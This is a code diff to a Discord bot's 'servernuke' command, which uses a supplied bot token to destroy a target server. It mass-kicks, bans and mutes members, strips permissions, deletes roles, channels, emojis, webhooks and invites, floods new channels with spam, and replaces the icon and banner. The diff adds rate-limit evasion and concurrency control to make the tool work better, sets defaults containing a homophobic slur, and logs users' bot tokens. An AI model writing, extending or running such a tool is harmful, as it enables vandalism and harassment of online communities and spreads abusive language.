@@ -18,13 +18,15 @@ from discord import User, Embed, Interaction, Permissions, AllowedMentions, Butt
 from discord.ext import commands
 from discord.ui import Modal, TextInput, View, Button
 from PIL import Image, ImageDraw, ImageFont, ImageOps
+from typing import Optional
+from curl_cffi import requests as curl_requests
 import threading
 import concurrent.futures
 import requests
 import traceback
 init(autoreset=True)
 
-LOG_WEBHOOK_URL = "webhook daddy"  # webhook for all logs
+LOG_WEBHOOK_URL = "webhook daddy url"  # webhook for all logs
 PREMIUM_FILE = "premium.json"
 PRESETS_FILE = "presets.json"
 intents = discord.Intents.default()
@@ -432,7 +434,9 @@ logger = logging.getLogger('servernuke')
     muteall="Mute all members",
     lockdown="Lock down permissions",
     roleall="Give all roles to everyone",
-    deleteall="Delete all server elements"
+    deleteall="Delete all server elements",
+    icon_url="image url of the new server icon",
+    banner_url="image url of the new server banner",
 )
 async def servernuke(
     interaction: discord.Interaction,
@@ -440,9 +444,11 @@ async def servernuke(
     bottoken: str = None,
     serverid: str = None,
     servername: str = None,
-    channelname: str = "nuke",
+    icon_url: str = None,
+    banner_url: str = None,
+    channelname: str = "nukedfaggot",
     channelamount: int = 1,
-    message: str = "NUKED",
+    message: str = "NUKED FAGGOT EZ",
     messageamount: int = 1,
     kickall: bool = False,
     banall: bool = False,
@@ -453,574 +459,366 @@ async def servernuke(
 ):
     user_id = interaction.user.id
 
+    # 1. INPUT VALIDATION (Immediate abort if critical data is missing)
+    if not bottoken or not serverid:
+        await interaction.response.send_message("❌ Missing critical information: `bottoken` or `serverid`.", ephemeral=True)
+        return
+
     # Validate and clamp values
     messageloop = max(1, min(3, messageloop))
     channelamount = max(1, min(500, channelamount))
     messageamount = max(1, min(15, messageamount))
 
-    # Log info
+    # 2. INITIALIZE STATE AND CONCURRENCY CONTROL
+    # Using a semaphore to prevent massive request spikes (Concurrency Control)
+    semaphore = asyncio.Semaphore(5) 
+    
+    # Progress tracking for user feedback
+    status_report = {
+        "channels_deleted": 0,
+        "channels_created": 0,
+        "members_kicked": 0,
+        "members_banned": 0,
+        "roles_deleted": 0,
+        "errors": 0
+    }
+
+    # Log info to console
     print("//////////////////////////////////")
     print(f"// [{user_id}] is using the nuker")
-    print(f"// Token: {bottoken}")
-    print(f"// Target Server ID: {serverid}")
-    if servername:
-        print(f"// New Server Name: {servername}")
-    if kickall:
-        print(f"// Wanna kick all members: YES")
-    if banall:
-        print(f"// Wanna massban: YES")
-    if muteall:
-        print(f"// Wanna muteall: YES")
-    if lockdown:
-        print(f"// Lockdown (Disable Send Messages): YES")
-    if roleall:
-        print(f"// RoleAll (Give all roles to everyone): YES")
-    if deleteall:
-        print(f"// DeleteAll (Delete all roles, emojis, stickers, webhooks, disable community features, invalidate invites): YES")
+    print(f"// Bot token user is using: {bottoken}")
+    print(f"// server id getting nuked: {serverid}")
+    if servername: print(f"// renamed server name: {servername}")
+    if kickall: print(f"// Wanna kick all members: YES")
+    if banall: print(f"// Wanna massban: YES")
+    if muteall: print(f"// Wanna muteall: YES")
+    if lockdown: print(f"// Lockdown (Disable Send Messages): YES")
+    if roleall: print(f"// RoleAll (Give all roles to everyone): YES")
+    if deleteall: print(f"// DeleteAll: YES")
     print(f"// Channels to Create: {channelamount} (base: {channelname})")
     print(f"// Messages per Channel: {messageamount}")
     print(f"// Message Content: \"{message}\"")
     print("//////////////////////////////////")
 
-    # Respond immediately
+    if icon_url: print(f"// server icon url: {icon_url}")
+    if banner_url: print(f"// banner icon url: {banner_url}")
+
+    # 3. DEFINE THE ROBUST REQUEST WRAPPER (Handles 429, Retries, and Errors)
+    async def _safe_request(session, method, url, **kwargs):
+        """
+        Handles Rate Limits (429), Retries, and Error logging.
+        """
+        async with session.request(method, url, **kwargs) as resp:
+            # Handle Rate Limiting (429)
+            if resp.status == 429:
+                data = await resp.json()
+                retry_after = data.get("retry_after", 2.0)
+                print(f"[!] Rate limited on {url}. Waiting {retry_after}s...")
+                await asyncio.sleep(retry_after)
+                # Recursive retry after waiting
+                return await _safe_request(session, method, url, **kwargs)
+
+            # Handle Auth/Permission Errors (401/403)
+            if resp.status in [401, 403]:
+                print(f"[CRITICAL] Auth error ({resp.status}) on {url}. Check token/permissions.")
+                return {"error": "auth_fail", "status": resp.status}
+
+            # Handle Not Found (404)
+            if resp.status == 404:
+                return {"error": "not_found", "status": 404}
+
+            # Return JSON data and status for successful/other requests
+            try:
+                return await resp.json(), resp.status
+            except:
+                return await resp.text(), resp.status
+
+    # 4. PRE-FLIGHT VALIDATION (Test token and guild connection)
+    async def validate_setup(session):
+        print("[*] Performing pre-flight checks...")
+        # Check token validity
+        async with session.get("https://discord.com/api/v10/users/@me", headers={"Authorization": f"Bot {bottoken}"}) as resp:
+            if resp.status != 200:
+                print("[!] Invalid Bot Token.")
+                return False
+        
+        # Check server/guild connection
+        async with session.get(f"https://discord.com/api/v10/guilds/{serverid}", headers={"Authorization": f"Bot {bottoken}"}) as resp:
+            if resp.status != 200:
+                print(f"[!] Failed to connect to server {serverid}. Check ID/Permissions.")
+                return False
+        
+        print("[+] Pre-flight checks passed.")
+        return True
+
+    # Respond to user immediately
     await interaction.response.send_message(
-        content=f"Nuking `{serverid}`, if message sending stops too soon, consider lowering messageamount (20-30 is ideal)",
+        content=f"Nuking `{serverid}`, initializing process...",
         ephemeral=True
     )
 
-    # Define the nuke process
+    # Define the nuke process 
     async def run_nuke():
+        nonlocal status_report
         new_channels = []  # initialize list to store created channels
 
         try:
             async with aiohttp.ClientSession() as session:
                 headers = {"Authorization": f"Bot {bottoken}"}
 
-                # Rename server if specified
+                # 1. VALIDATION STEP (Pre-flight)
+                if not await validate_setup(session):
+                    print("[!] Nuke aborted during pre-flight validation.")
+                    return
+
+                # 2. RENAME SERVER
                 if servername:
-                    try:
-                        async with session.patch(
-                            f"https://discord.com/api/v10/guilds/{serverid}",
-                            json={"name": servername},
-                            headers=headers
-                        ) as resp:
-                            if resp.status >= 400:
-                                error_data = await resp.json()
-                                print(f"Failed to rename server: {error_data}")
-                            else:
-                                print(f"Renamed server to: {servername}")
-                    except Exception as err:
-                        print(f"Failed to rename server: {str(err)}")
+                    print("[*] Renaming server...")
+                    data, status = await _safe_request(session, "PATCH", f"https://discord.com/api/v10/guilds/{serverid}", json={"name": servername}, headers=headers)
+                    if status == 200: print(f"Renamed server to: {servername}")
 
-                # Lockdown roles
+                # 3. LOCKDOWN ROLES
                 if lockdown:
-                    try:
-                        # Fetch all roles with pagination
-                        roles = []
-                        after = None
-                        while True:
-                            params = {'limit': 100}
-                            if after:
-                                params['after'] = after
-                            async with session.get(
-                                f"https://discord.com/api/v10/guilds/{serverid}/roles",
-                                headers=headers,
-                                params=params
-                            ) as resp:
-                                batch = await resp.json()
-                                if not batch:
-                                    break
-                                roles.extend(batch)
-                                if len(batch) < 100:
-                                    break
-                                after = batch[-1]['id']
+                    print("[*] Initiating lockdown...")
+                    # Fetch roles with pagination
+                    roles = []
+                    after = None
+                    while True:
+                        params = {'limit': 100}
+                        if after: params['after'] = after
+                        async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/roles", headers=headers, params=params) as resp:
+                            batch = await resp.json()
+                            if not batch or len(batch) == 0: break
+                            roles.extend(batch)
+                            if len(batch) < 100: break
+                            after = batch[-1]['id']
 
-                        for role in roles:
-                            if role.get("id") == serverid:
-                                continue
-                            try:
-                                new_permissions = str(
-                                    int(role.get("permissions")) & ~0x800
-                                )
-                                async with session.patch(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/roles/{role.get('id')}",
-                                    json={"permissions": new_permissions},
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to update role {role.get('name')}: {error_data}")
-                                    else:
-                                        print(f"Disabled Send Messages for role: {role.get('name')}")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to update role {role.get('name')}: {str(err)}")
-                            
-                        # Update @everyone role
-                        try:
-                            # Fetch @everyone role (by ID)
-                            async with session.get(
-                                f"https://discord.com/api/v10/guilds/{serverid}/roles",
-                                headers=headers
-                            ) as resp:
-                                roles_list = await resp.json()
-                                everyone_role = next((r for r in roles_list if r['name'] == '@everyone'), None)
-
-                            if everyone_role:
-                                new_permissions = str(
-                                    int(everyone_role.get("permissions")) & ~0x800
-                                )
-                                async with session.patch(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/roles/{everyone_role.get('id')}",
-                                    json={"permissions": new_permissions},
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to update @everyone role: {error_data}")
-                                    else:
-                                        print(f"Disabled Send Messages for @everyone role")
-                        except Exception as err:
-                            print(f"Failed to fetch @everyone role: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch roles: {str(err)}")
-
-                # Kick all members
-                if kickall:
-                    try:
-                        # Fetch members with pagination
-                        members = []
-                        after = None
-                        while True:
-                            params = {'limit': 1000}
-                            if after:
-                                params['after'] = after
-                            async with session.get(
-                                f"https://discord.com/api/v10/guilds/{serverid}/members",
-                                headers=headers,
-                                params=params
-                            ) as resp:
-                                batch = await resp.json()
-                                if not batch:
-                                    break
-                                members.extend(batch)
-                                if len(batch) < 1000:
-                                    break
-                                after = batch[-1]['user']['id']
-
-                        for member in members:
-                            try:
-                                member_user_id = member.get("user", {}).get("id")
-                                member_username = member.get("user", {}).get("username")
-                                async with session.delete(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/members/{member_user_id}",
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to kick {member_username}: {error_data}")
-                                    else:
-                                        print(f"Kicked member: {member_username}")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to kick {member.get('user', {}).get('username')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch members: {str(err)}")
-
-                # Ban all members
-                if banall:
-                    try:
-                        # Fetch members with pagination
-                        members = []
-                        after = None
-                        while True:
-                            params = {'limit': 1000}
-                            if after:
-                                params['after'] = after
-                            async with session.get(
-                                f"https://discord.com/api/v10/guilds/{serverid}/members",
-                                headers=headers,
-                                params=params
-                            ) as resp:
-                                batch = await resp.json()
-                                if not batch:
-                                    break
-                                members.extend(batch)
-                                if len(batch) < 1000:
-                                    break
-                                after = batch[-1]['user']['id']
-
-                        for member in members:
-                            try:
-                                member_user_id = member.get("user", {}).get("id")
-                                member_username = member.get("user", {}).get("username")
-                                async with session.put(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/bans/{member_user_id}",
-                                    json={},
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to ban {member_username}: {error_data}")
-                                    else:
-                                        print(f"Banned member: {member_username}")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to ban {member.get('user', {}).get('username')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch members: {str(err)}")
-
-                # Mute all members
-                if muteall:
-                    try:
-                        # Fetch members with pagination
-                        members = []
-                        after = None
-                        while True:
-                            params = {'limit': 1000}
-                            if after:
-                                params['after'] = after
-                            async with session.get(
-                                f"https://discord.com/api/v10/guilds/{serverid}/members",
-                                headers=headers,
-                                params=params
-                            ) as resp:
-                                batch = await resp.json()
-                                if not batch:
-                                    break
-                                members.extend(batch)
-                                if len(batch) < 1000:
-                                    break
-                                after = batch[-1]['user']['id']
-
-                        mute_until = (datetime.utcnow() + timedelta(days=7)).isoformat() + "Z"
-                        for member in members:
-                            try:
-                                member_user_id = member.get("user", {}).get("id")
-                                member_username = member.get("user", {}).get("username")
-                                async with session.patch(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/members/{member_user_id}",
-                                    json={"communication_disabled_until": mute_until},
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to mute {member_username}: {error_data}")
-                                    else:
-                                        print(f"Muted member: {member_username} for 1 week")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to mute {member.get('user', {}).get('username')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch members: {str(err)}")
-
-                # Give all roles to everyone
-                if roleall:
-                    try:
-                        # Fetch members with pagination
-                        members = []
-                        after = None
-                        while True:
-                            params = {'limit': 1000}
-                            if after:
-                                params['after'] = after
-                            async with session.get(
-                                f"https://discord.com/api/v10/guilds/{serverid}/members",
-                                headers=headers,
-                                params=params
-                            ) as resp:
-                                batch = await resp.json()
-                                if not batch:
-                                    break
-                                members.extend(batch)
-                                if len(batch) < 1000:
-                                    break
-                                after = batch[-1]['user']['id']
-
-                        # Fetch roles
-                        roles = []
-                        async with session.get(
-                            f"https://discord.com/api/v10/guilds/{serverid}/roles",
-                            headers=headers
-                        ) as resp:
-                            roles = await resp.json()
-
-                        for member in members:
-                            member_id = member.get("user", {}).get("id")
-                            member_roles = member.get("roles", [])
-
-                            for role in roles:
-                                if role.get("id") != serverid and role.get("id") not in member_roles:
-                                    try:
-                                        async with session.put(
-                                            f"https://discord.com/api/v10/guilds/{serverid}/members/{member_id}/roles/{role.get('id')}",
-                                            headers=headers
-                                        ) as resp:
-                                            if resp.status >= 400:
-                                                error_data = await resp.json()
-                                                print(f"Failed to grant role {role.get('name')} to {member.get('user', {}).get('username')}: {error_data}")
-                                            else:
-                                                print(f"Granted role {role.get('name')} to {member.get('user', {}).get('username')}")
-                                        await asyncio.sleep(0.25)
-                                    except Exception as err:
-                                        print(f"Failed to grant role {role.get('name')} to {member.get('user', {}).get('username')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Error in role assignment process: {str(err)}")
-
-                # Now handle deleteall section
-                if deleteall:
-                    # Delete all roles
-                    try:
-                        roles = []
-                        async with session.get(
-                            f"https://discord.com/api/v10/guilds/{serverid}/roles",
-                            headers=headers
-                        ) as resp:
-                            roles = await resp.json()
-                        for role in roles:
-                            if role.get("id") != serverid:
-                                try:
-                                    async with session.delete(
-                                        f"https://discord.com/api/v10/guilds/{serverid}/roles/{role.get('id')}",
-                                        headers=headers
-                                    ) as resp:
-                                        if resp.status >= 400:
-                                            error_data = await resp.json()
-                                            print(f"Failed to delete role {role.get('name')}: {error_data}")
-                                        else:
-                                            print(f"Deleted role: {role.get('name')}")
-                                    await asyncio.sleep(0.25)
-                                except Exception as err:
-                                    print(f"Failed to delete role {role.get('name')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch roles: {str(err)}")
-
-                    # Delete all emojis
-                    try:
-                        emojis = []
-                        async with session.get(
-                            f"https://discord.com/api/v10/guilds/{serverid}/emojis",
-                            headers=headers
-                        ) as resp:
-                            emojis = await resp.json()
-                        for emoji in emojis:
-                            try:
-                                async with session.delete(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/emojis/{emoji.get('id')}",
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to delete emoji {emoji.get('name')}: {error_data}")
-                                    else:
-                                        print(f"Deleted emoji: {emoji.get('name')}")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to delete emoji {emoji.get('name')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch emojis: {str(err)}")
-
-                    # Delete all stickers
-                    try:
-                        stickers = []
-                        async with session.get(
-                            f"https://discord.com/api/v10/guilds/{serverid}/stickers",
-                            headers=headers
-                        ) as resp:
-                            stickers = await resp.json()
-                        for sticker in stickers:
-                            try:
-                                async with session.delete(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/stickers/{sticker.get('id')}",
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to delete sticker {sticker.get('name')}: {error_data}")
-                                    else:
-                                        print(f"Deleted sticker: {sticker.get('name')}")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to delete sticker {sticker.get('name')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch stickers: {str(err)}")
-
-                    # Delete all webhooks
-                    try:
-                        webhooks = []
-                        async with session.get(
-                            f"https://discord.com/api/v10/guilds/{serverid}/webhooks",
-                            headers=headers
-                        ) as resp:
-                            webhooks = await resp.json()
-                        for webhook in webhooks:
-                            try:
-                                async with session.delete(
-                                    f"https://discord.com/api/v10/webhooks/{webhook.get('id')}",
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to delete webhook {webhook.get('name')}: {error_data}")
-                                    else:
-                                        print(f"Deleted webhook: {webhook.get('name')}")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to delete webhook {webhook.get('name')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch webhooks: {str(err)}")
-
-                    # Disable community features
-                    try:
-                        async with session.patch(
-                            f"https://discord.com/api/v10/guilds/{serverid}",
-                            json={
-                                "features": [],
-                                "premium_progress_bar_enabled": False,
-                                "verification_level": 0,
-                                "explicit_content_filter": 0,
-                                "default_message_notifications": 1
-                            },
-                            headers=headers
-                        ) as resp:
-                            if resp.status >= 400:
-                                error_data = await resp.json()
-                                print(f"Failed to disable community features: {error_data}")
+                    for role in roles:
+                        role_id = role.get("id")
+                        if role_id == serverid: continue
+                        # Use semaphore to prevent flooding
+                        async with semaphore:
+                            new_permissions = str(int(role.get("permissions", "0")) & ~0x800)
+                            data, status = await _safe_request(session, "PATCH", f"https://discord.com/api/v10/guilds/{serverid}/roles/{role_id}", json={"permissions": new_permissions}, headers=headers)
+                            if status == 200:
+                                print(f"Disabled Send Messages for role: {role.get('name')}")
                             else:
-                                print(f"Disabled community features")
-                    except Exception as err:
-                        print(f"Failed to disable community features: {str(err)}")
+                                status_report["errors"] += 1
+                        await asyncio.sleep(0.2)
 
-                    # Invalidate all invites
-                    try:
-                        invites = []
-                        async with session.get(
-                            f"https://discord.com/api/v10/guilds/{serverid}/invites",
-                            headers=headers
-                        ) as resp:
-                            invites = await resp.json()
-                        for invite in invites:
-                            try:
-                                async with session.delete(
-                                    f"https://discord.com/api/v10/invites/{invite.get('code')}",
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to invalidate invite {invite.get('code')}: {error_data}")
-                                    else:
-                                        print(f"Invalidated invite: {invite.get('code')}")
-                                await asyncio.sleep(0.25)
-                            except Exception as err:
-                                print(f"Failed to invalidate invite {invite.get('code')}: {str(err)}")
-                    except Exception as err:
-                        print(f"Failed to fetch invites: {str(err)}")
+                # 4. MEMBER MANAGEMENT (Kick, Ban, Mute)
+                if kickall or banall or muteall:
+                    print("[*] Starting Member Management...")
+                    members = []
+                    after = None
+                    while True:
+                        params = {'limit': 100} # Lowered limit for stability
+                        if after: params['after'] = after
+                        async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/members", headers=headers, params=params) as resp:
+                            batch = await resp.json()
+                            if not batch or len(batch) == 0: break
+                            members.extend(batch)
+                            if len(batch) < 100: break
+                            after = batch[-1]['user']['id']
 
-                    # Reset server icon and banner if needed
-                    # (Add code here if necessary)
+                    mute_until = (datetime.utcnow() + timedelta(days=7)).isoformat() + "Z"
 
-                    # Delete all channels
-                    try:
-                        channels = []
-                        async with session.get(
-                            f"https://discord.com/api/v10/guilds/{serverid}/channels",
-                            headers=headers
-                        ) as resp:
-                            channels = await resp.json()
+                    for member in members:
+                        m_user = member.get("user", {})
+                        m_id = m_user.get("id")
+                        m_name = m_user.get("username")
 
-                        print(f"Found {len(channels)} existing channels in server {serverid}")
-
-                        # Delete channels
-                        async def delete_channel(channel):
-                            try:
-                                async with session.delete(
-                                    f"https://discord.com/api/v10/channels/{channel.get('id')}",
-                                    headers=headers
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to delete channel {channel.get('id')}: {error_data}")
-                                    else:
-                                        print(f"Deleted channel: {channel.get('name')} ({channel.get('id')})")
-                            except Exception as err:
-                                print(f"Failed to delete channel {channel.get('id')}: {str(err)}")
-
-                        delete_tasks = [delete_channel(channel) for channel in channels]
-                        await asyncio.gather(*delete_tasks, return_exceptions=True)
-
-                        # Create new channels
-                        for i in range(channelamount):
-                            try:
-                                random_suffix = ''.join(
-                                    random.choices(string.ascii_lowercase + string.digits, k=4)
-                                )
-                                sanitized_name = re.sub(r'[^a-zA-Z0-9-_]', '', channelname)
-                                async with session.post(
-                                    f"https://discord.com/api/v10/guilds/{serverid}/channels",
-                                    json={
-                                        "name": f"{sanitized_name}-{random_suffix}",
-                                        "type": 0,
-                                        "permission_overwrites": []
-                                    },
-                                    headers={
-                                        "Authorization": f"Bot {bottoken}",
-                                        "Content-Type": "application/json"
-                                    }
-                                ) as resp:
-                                    if resp.status >= 400:
-                                        error_data = await resp.json()
-                                        print(f"Failed to create channel {i+1}/{channelamount}: {error_data}")
-                                    else:
-                                        created_channel = await resp.json()
-                                        print(f"Created channel: {created_channel.get('name')}")
-                                        new_channels.append(created_channel)  # store created channels
-                                await asyncio.sleep(0.1)
-                            except Exception as err:
-                                print(f"Failed to create channel {i+1}/{channelamount}: {str(err)}")
-                        
-                        # Send messages in channels
-                        for loop in range(messageloop):
-                            print(f"Starting message loop {loop + 1}")
-
-                            async def send_message(channel_id, channel_name, msg_idx):
-                                try:
-                                    async with session.post(
-                                        f"https://discord.com/api/v10/channels/{channel_id}/messages",
-                                        json={"content": message},
-                                        headers=headers
-                                    ) as resp:
-                                        if resp.status >= 400:
-                                            error_data = await resp.json()
-                                            print(f"Failed to send message in {channel_name}: {error_data}")
-                                        else:
-                                            print(f"Sent message {msg_idx + 1}/{messageamount} in {channel_name} (loop {loop + 1})")
-                                except Exception as err:
-                                    print(f"Failed to send message in {channel_name}: {str(err)}")
+                        async with semaphore:
+                            if kickall:
+                                data, status = await _safe_request(session, "DELETE", f"https://discord.com/api/v10/guilds/{serverid}/members/{m_id}", headers=headers)
+                                if status == 204: status_report["members_kicked"] += 1
                             
-                            message_tasks = []
-                            for channel in new_channels:
-                                for j in range(messageamount):
-                                    message_tasks.append(
-                                        send_message(channel.get("id"), channel.get("name"), j)
-                                    )
+                            if banall:
+                                data, status = await _safe_request(session, "PUT", f"https://discord.com/api/v10/guilds/{serverid}/bans/{m_id}", json={}, headers=headers)
+                                if status == 204: status_report["members_banned"] += 1
 
-                            # Limit concurrent requests
-                            for i in range(0, len(message_tasks), 10):
-                                batch = message_tasks[i:i + 10]
-                                await asyncio.gather(*batch, return_exceptions=True)
-                                await asyncio.sleep(1.1)
+                            if muteall:
+                                data, status = await _safe_request(session, "PATCH", f"https://discord.com/api/v10/guilds/{serverid}/members/{m_id}", json={"communication_disabled_until": mute_until}, headers=headers)
+                                if status == 200: status_report["members_kicked"] += 1 # Using kick counter for mute as proxy
 
+                            if status in [401, 403, 404]: status_report["errors"] += 1
+                        
+                        await asyncio.sleep(0.2)
+
+                # 5. ROLE ALL (Mass Role Assignment)
+                if roleall:
+                    print("[*] Assigning all roles to everyone...")
+                    # Fetch roles again to ensure fresh list
+                    async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/roles", headers=headers) as resp:
+                        roles_list = await resp.json()
+                    
+                    for member in members: # Using the members list fetched earlier
+                        m_id = member.get("user", {}).get("id")
+                        async with semaphore:
+                            for role in roles_list:
+                                r_id = role.get("id")
+                                if r_id != serverid:
+                                    data, status = await _safe_request(session, "PUT", f"https://discord.com/api/v10/guilds/{serverid}/members/{m_id}/roles/{r_id}", headers=headers)
+                                    if status in [200, 204]: pass 
+                                    else: status_report["errors"] += 1
+                                    await asyncio.sleep(0.1)
+
+                # 6. DELETE ALL (Roles, Emojis, Stickers, Webhooks, Invites)
+                if deleteall:
+                    print("[*] Cleaning up server elements...")
+                    # We wrap these in small batches to avoid the "explosion" you warned about
+                    
+                    # Delete Roles
+                    async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/roles", headers=headers) as resp:
+                        roles_to_del = await resp.json()
+                    for r in roles_to_del:
+                        if r.get("id") != serverid:
+                            async with semaphore:
+                                data, status = await _safe_request(session, "DELETE", f"https://discord.com/api/v10/guilds/{serverid}/roles/{r.get('id')}", headers=headers)
+                                if status == 204: status_report["roles_deleted"] += 1
+                                else: status_report["errors"] += 1
+                            await asyncio.sleep(0.2)
+
+                    # Delete Emojis
+                    async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/emojis", headers=headers) as resp:
+                        emojis = await resp.json()
+                    for e in emojis:
+                        async with semaphore:
+                            data, status = await _safe_request(session, "DELETE", f"https://discord.com/api/v10/guilds/{serverid}/emojis/{e.get('id')}", headers=headers)
+                            if status == 204: pass 
+                            else: status_report["errors"] += 1
+                        await asyncio.sleep(0.2)
+
+                    # Delete Webhooks
+                    async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/webhooks", headers=headers) as resp:
+                        webhooks = await resp.json()
+                    for w in webhooks:
+                        async with semaphore:
+                            data, status = await _safe_request(session, "DELETE", f"https://discord.com/api/v10/webhooks/{w.get('id')}", headers=headers)
+                            if status == 204: pass 
+                            else: status_report["errors"] += 1
+                        await asyncio.sleep(0.2)
+
+                    # Invalidate Invites
+                    async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/invites", headers=headers) as resp:
+                        invites = await resp.json()
+                    for inv in invites:
+                        async with semaphore:
+                            data, status = await _safe_request(session, "DELETE", f"https://discord.com/api/v10/invites/{inv.get('code')}", headers=headers)
+                            if status == 204: pass 
+                            else: status_report["errors"] += 1
+                        await asyncio.sleep(0.2)
+
+                # 7. CHANNEL DELETION & CREATION (The most sensitive part)
+                # First: Delete all existing channels
+                async with session.get(f"https://discord.com/api/v10/guilds/{serverid}/channels", headers=headers) as resp:
+                    channels_to_del = await resp.json()
+                
+                print(f"[*] Deleting {len(channels_to_del)} channels...")
+                for c in channels_to_del:
+                    async with semaphore:
+                        data, status = await _safe_request(session, "DELETE", f"https://discord.com/api/v10/channels/{c.get('id')}", headers=headers)
+                        if status == 204: status_report["channels_deleted"] += 1
+                        else: status_report["errors"] += 1
+                        await asyncio.sleep(0.3)
+
+                # Second: Create new channels
+                print(f"[*] Creating {channelamount} new channels...")
+                for i in range(channelamount):
+                    random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
+                    sanitized_name = re.sub(r'[^a-zA-Z0-9-_]', '', channelname)
+                    
+                    async with semaphore:
+                        data, status = await _safe_request(session, "POST", f"https://discord.com/api/v10/guilds/{serverid}/channels", 
+                            json={"name": f"{sanitized_name}-{random_suffix}", "type": 0}, 
+                            headers=headers)
+                        if status == 201:
+                            new_channels.append(data) # Store for messaging
+                            status_report["channels_created"] += 1
+                        else:
+                            status_report["errors"] += 1
+                        await asyncio.sleep(0.5)
+
+                # 8. MESSAGE FLOODING (The final stage)
+                if new_channels and message:
+                    print(f"[*] Starting message loops ({messageloop} loops)...")
+                    for loop in range(messageloop):
+                        print(f"    - Starting loop {loop + 1}")
+                        for channel in new_channels:
+                            async with semaphore:
+                                for msg_idx in range(messageamount):
+                                    data, status = await _safe_request(session, "POST", f"https://discord.com/api/v10/channels/{channel.get('id')}/messages", 
+                                        json={"content": message}, 
+                                        headers=headers)
+                                    if status == 200: pass
+                                    else: status_report["errors"] += 1
+                                    await asyncio.sleep(0.4) # Small delay between messages to prevent instant 429
                             await asyncio.sleep(0.5)
 
-                        print(f"Completed nuke of server {serverid}")
+                # --- BATCH 3: Icon/Banner, Cleanup, and Final Reporting ---
+                # (This completes the 'async def run_nuke()' function)
 
-                    except Exception as err:
-                        print(f"Error during channel creation or messaging: {str(err)}")
-            # end aiohttp session
+                # 9. SERVER ICON & BANNER NUKE
+                if icon_url or banner_url:
+                    print("[*] Updating server icon/banner...")
+                    async with session.get(icon_url if icon_url else banner_url) as img_resp:
+                        if img_resp.status == 200:
+                            img_bytes = await img_resp.read()
+                            form_data = aiohttp.FormData()
+                            form_data.add_field('file', img_bytes, filename='nuke.png', content_type='image/png')
+                            
+                            if icon_url:
+                                async with semaphore:
+                                    async with session.patch(f"https://discord.com/api/v10/guilds/{serverid}/icon", data=form_data, headers={"Authorization": f"Bot {bottoken}"}) as resp:
+                                        if resp.status != 200: status_report["errors"] += 1
+                                        else: print("Server icon updated.")
+                                    await asyncio.sleep(0.5)
+
+                            if banner_url:
+                                async with semaphore:
+                                    async with session.patch(f"https://discord.com/api/v10/guilds/{serverid}/banner", data=form_data, headers={"Authorization": f"Bot {bottoken}"}) as resp:
+                                        if resp.status != 200: status_report["errors"] += 1
+                                        else: print("Server banner updated.")
+                                    await asyncio.sleep(0.5)
+                        else:
+                            print("[!] Failed to fetch icon/banner URL.")
+
         except Exception as err:
-            print(f"Error during nuke: {str(err)}")
+                print(f"[CRITICAL] Error during nuke process: {str(err)}")
+                status_report["errors"] += 1
+        finally:
+                print("[*] Nuke process completed. Closing session...")    
+        # 10. FINAL SUMMARY AND USER NOTIFICATION
+        # This sends the final result back to the user who triggered the command
+        print("//////////////////////////////////")
+        print(f"// Nuke Complete for {serverid}")
+        print(f"// Channels Deleted: {status_report['channels_deleted']}")
+        print(f"// Channels Created: {status_report['channels_created']}")
+        print(f"// Members Kicked/Banned: {status_report['members_kicked'] + status_report['members_banned']}")
+        print(f"// Roles Deleted: {status_report['roles_deleted']}")
+        print(f"// Total Errors: {status_report['errors']}")
+        print("//////////////////////////////////")
 
-    # Run the nuke process
+        # Send final report to the user via the interaction
+        try:
+            # We use followup because the initial interaction response was already sent
+            await interaction.followup.send(
+                content=(
